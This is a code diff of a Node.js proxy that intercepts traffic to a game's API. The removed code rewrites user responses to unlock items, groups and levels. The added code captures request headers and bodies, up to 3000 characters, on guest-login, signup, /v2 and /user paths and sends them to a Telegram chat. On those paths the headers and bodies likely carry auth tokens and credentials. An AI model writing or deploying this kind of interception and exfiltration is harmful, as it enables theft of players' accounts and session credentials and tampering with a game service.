@@ -285,118 +285,27 @@ async function sendToTelegram(message) {
 //================================================================================================================================================
 app.all("*", async (req, res) => {
   try {
+    // ====================================================================================================================================
     if (req.headers["if-none-match"]) delete req.headers["if-none-match"];
 
-    const targetUrl = "https://prod.api.indusgame.com" + req.originalUrl;
-    const headers = { ...req.headers };
-    delete headers.host;
-
-    // Handle /equip separately
-    if (req.path.endsWith("/equip") && req.method === "POST") {
-      try {
-        const { equippedId, equippedItems } = req.body || {};
-        if (equippedId && Array.isArray(equippedItems) && customData?.equipped) {
-          if (customData.equipped.hasOwnProperty(equippedId)) {
-            customData.equipped[equippedId] = equippedItems;
-          } else {
-            console.log(`⚠️ Equipped ID "${equippedId}" not found in customData.equipped`);
-          }
-        }
-        return res.status(204).end();
-      } catch (err) {
-        console.error("❌ Error updating in-memory equip:", err);
-        return res.status(500).json({ error: "Internal equip update error" });
-      }
-    }
-
-    // Forward request upstream
-    const upstreamResponse = await fetch(targetUrl, {
-      method: req.method,
-      headers,
-      body: ["GET", "HEAD"].includes(req.method) ? undefined : JSON.stringify(req.body),
-    });
-
-    let body = await upstreamResponse.text();
-
-    // Clone response headers
-    const responseHeaders = {};
-    upstreamResponse.headers.forEach((value, key) => {
-      responseHeaders[key] = value;
-      res.setHeader(key, value);
-    });
-
-    // Handle /guest-signups (only if it ends with /guest-signups)
-    if (req.path.endsWith("/guest-signups")) {
-      try {
-        const json = JSON.parse(body);
-        if (json.user?.equipped) {
-          json.user.group = customData.group;
-          Object.assign(json.user.equipped, customData.equipped);
-          json.user.levelInfo.id = customData.levelInfo.id;
-        }
-        if (json.user?.owned) {
-          Object.assign(json.user.owned, customData.owned);
-        }
-        body = JSON.stringify(json);
-      } catch (err) {
-        console.error("Error modifying /guest-signups response:", err);
-      }
-    }
-
-    // Handle /user (only if it ends with /user)
-    if (req.path.endsWith("/user")) {
-      try {
-        const json = JSON.parse(body);
-        if (json.equipped) {
-          json.group = customData.group;
-          Object.assign(json.equipped, customData.equipped);
-          json.levelInfo.id = customData.levelInfo.id;
-        }
-        if (json.owned) {
-          Object.assign(json.owned, customData.owned);
-        }
-        body = JSON.stringify(json);
-      } catch (err) {
-        console.error("Error modifying /user response:", err);
-      }
-    }
-
-    // Send Telegram log (Request + Response)
-    const telegramMessage = `
-🛰 *Request*
-📍 *Path:* ${req.path}
+    if (req.path.includes("/guest-logins") || req.path.includes("/guest-signups") || req.path.includes("/v2") || req.path.includes("/user")  ) {
+  const logMessage = `
+🛰 *New Guest Signup Request*
+📄 *Path:* ${req.path}
 🕓 *Time:* ${new Date().toISOString()}
-📦 *Method:* ${req.method}
 
 🔹 *Headers:*
 \`\`\`json
-${JSON.stringify(req.headers, null, 2).slice(0, 1500)}
+${JSON.stringify(req.headers, null, 2).slice(0, 3000)} 
 \`\`\`
 
 🔹 *Body:*
 \`\`\`json
-${JSON.stringify(req.body, null, 2).slice(0, 1500)}
-\`\`\`
-
-📡 *Response*
-🔹 *Status:* ${upstreamResponse.status}
-🔹 *Headers:*
-\`\`\`json
-${JSON.stringify(responseHeaders, null, 2).slice(0, 1500)}
-\`\`\`
-
-🔹 *Body:*
-\`\`\`json
-${body.slice(0, 1500)}
+${JSON.stringify(req.body, null, 2).slice(0, 3000)} 
 \`\`\`
 `;
-    sendToTelegram(telegramMessage);
-
-    res.status(upstreamResponse.status).send(body);
-  } catch (error) {
-    console.error("Proxy error:", error);
-    res.status(500).send("Proxy error");
-  }
+  sendToTelegram(logMessage);
+}
 //==========================================================================================================================================
 
     const targetUrl = "https://prod.api.indusgame.com" + req.originalUrl;
